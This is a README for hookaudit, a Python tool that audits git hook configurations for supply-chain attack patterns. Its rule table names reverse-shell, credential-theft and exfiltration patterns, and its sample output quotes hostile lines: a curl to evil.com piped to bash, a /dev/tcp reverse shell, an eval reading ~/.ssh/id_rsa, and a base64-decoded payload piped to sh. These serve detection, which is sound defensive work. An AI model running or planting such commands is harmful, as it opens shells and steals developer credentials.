# hookaudit

**Git Hook Security Auditor** — Scan git hook configurations for supply chain attack patterns.

Every existing tool *uses* hooks for scanning (secrets, linting). Nobody *scans the hooks themselves*. hookaudit fills this gap.

## The Problem

Git hooks run arbitrary code on your machine. Pre-commit configs pull from third-party repos. Husky scripts execute on every commit. Yet nobody audits these for:

- **Shell injection** — `curl | bash` in hook entries
- **Credential theft** — hooks reading `~/.ssh/`, `~/.aws/`, keychains
- **Data exfiltration** — piping secrets to remote servers
- **Supply chain risks** — unpinned versions, untrusted repos
- **Hidden payloads** — base64-encoded backdoors
- **Reverse shells** — `/dev/tcp` connections, netcat listeners

hookaudit scans all of these. Zero dependencies. Single file.

## Install

```bash
# Just download it
curl -O https://raw.githubusercontent.com/kriskimmerle/hookaudit/main/hookaudit.py
chmod +x hookaudit.py

# Or clone
git clone https://github.com/kriskimmerle/hookaudit.git
```

Requires Python 3.9+. No pip install needed.

## Usage

```bash
# Scan current project
python3 hookaudit.py

# Scan specific project
python3 hookaudit.py /path/to/project

# CI mode (exit 1 if below grade B)
python3 hookaudit.py --check B

# JSON output
python3 hookaudit.py --json

# Show fix suggestions
python3 hookaudit.py --verbose

# Only show critical/high findings
python3 hookaudit.py --severity HIGH

# Skip specific rules
python3 hookaudit.py --ignore HK005,HK006

# List all rules
python3 hookaudit.py --list-rules
```

## What It Scans

| Source | Files |
|--------|-------|
| **pre-commit** | `.pre-commit-config.yaml` |
| **Git hooks** | `.git/hooks/*` (custom scripts) |
| **Husky** | `.husky/*` (Node.js hook manager) |
| **Lefthook** | `lefthook.yml`, `lefthook-local.yml` |
| **lint-staged** | `package.json`, `.lintstagedrc*` |
| **Overcommit** | `.overcommit.yml` |
| **Custom paths** | `core.hooksPath` in git config |

## Rules (20)

| ID | Severity | Name | Description |
|----|----------|------|-------------|
| HK001 | CRITICAL | shell-injection | `curl\|bash`, `eval`, `exec` in hooks |
| HK002 | CRITICAL | reverse-shell | `/dev/tcp`, netcat, socat backdoors |
| HK003 | CRITICAL | data-exfiltration | POST with sensitive data to remote servers |
| HK004 | CRITICAL | credential-access | Reading `.ssh/`, `.aws/`, `.gnupg/`, keychain |
| HK005 | HIGH | unpinned-rev | Tag/branch instead of pinned SHA commit |
| HK006 | HIGH | untrusted-repo | Hook from unverified repository source |
| HK007 | HIGH | local-hook-danger | Local hook with dangerous commands |
| HK008 | HIGH | hidden-payload | Base64 decoding, obfuscated code |
| HK009 | MEDIUM | missing-rev | No version pinned (uses latest) |
| HK010 | MEDIUM | filesystem-escape | Accessing files outside repo boundary |
| HK011 | MEDIUM | sudo-usage | `sudo`, `su`, `doas`, setuid |
| HK012 | MEDIUM | network-access | `curl`, `wget`, `fetch`, socket connections |
| HK013 | MEDIUM | file-modification | `rm -rf`, truncation, dangerous file ops |
| HK014 | MEDIUM | env-manipulation | PATH, LD_PRELOAD, PYTHONPATH modification |
| HK015 | LOW | hook-bypass | `--no-verify`, SKIP patterns |
| HK016 | LOW | excessive-hooks | 20+ hooks increase attack surface |
| HK017 | HIGH | embedded-secret | Hardcoded API keys, tokens, private keys |
| HK018 | MEDIUM | dangerous-language | `system`/`script`/`docker` language hooks |
| HK019 | INFO | git-hook-script | Custom hook script inventory |
| HK020 | MEDIUM | writable-hooks-dir | World-writable hooks directory |

## Example Output

**Malicious config:**
```
hookaudit — Git Hook Security Auditor

  Grade: F (0/100)
  Findings: 11 critical, 13 high, 6 medium, 1 info

  .pre-commit-config.yaml
    ✖ [HK001] Shell injection in local hook 'build-check': curl piped to shell:26
      → curl https://evil.com/payload.sh | bash
    ✖ [HK004] Hook 'setup-env' accesses credentials: reading credential directory:32
      → bash -c "eval $(cat ~/.ssh/id_rsa | base64) && echo done"
    ✖ [HK017] Embedded secret in config: GitHub personal access token:53
      → --api-key=ghp_1234567890abcdefghijklmnopqrstuvwxyz

  .husky/pre-commit
    ✖ [HK002] Reverse shell: bash reverse shell via /dev/tcp:11
      → bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    ✖ [HK008] Hidden payload: base64 decode execution:14
      → echo "Y3VybCBod..." | base64 -d | sh
```

**Secure config:**
```
hookaudit — Git Hook Security Auditor

  Grade: A+ (100/100)
  Findings: none

  ✓ No security issues found in git hooks
```

## CI Integration

```yaml
# GitHub Actions
- name: Audit git hooks
  run: python3 hookaudit.py --check B --no-color
```

```yaml
# GitLab CI
hook-audit:
  script:
    - python3 hookaudit.py --check B --no-color
```

Exit codes: `0` = pass, `1` = below grade threshold, `2` = error.

## Why This Matters

Git hooks are a supply chain attack vector that's been hiding in plain sight:

- **pre-commit configs** pull code from arbitrary GitHub repos and execute it
- **Husky** runs shell scripts on every commit — if compromised, every developer is affected
- **Tags can be moved** — `rev: v4.5.0` can point to different code tomorrow; only SHA pins are immutable
- **Local hooks** with `language: system` run arbitrary shell commands
- **Nobody audits** what these hooks actually do

hookaudit is the first tool that treats git hooks as an attack surface rather than a trusted utility.

## Trusted Sources

hookaudit maintains a list of well-known pre-commit hook publishers (pre-commit, psf, PyCQA, astral-sh, Google, etc.). Hooks from trusted orgs get a pass on HK006; unknown repos are flagged for review.

To suppress for your own org: `--ignore HK006` or pin repos to SHA hashes.

## License

MIT
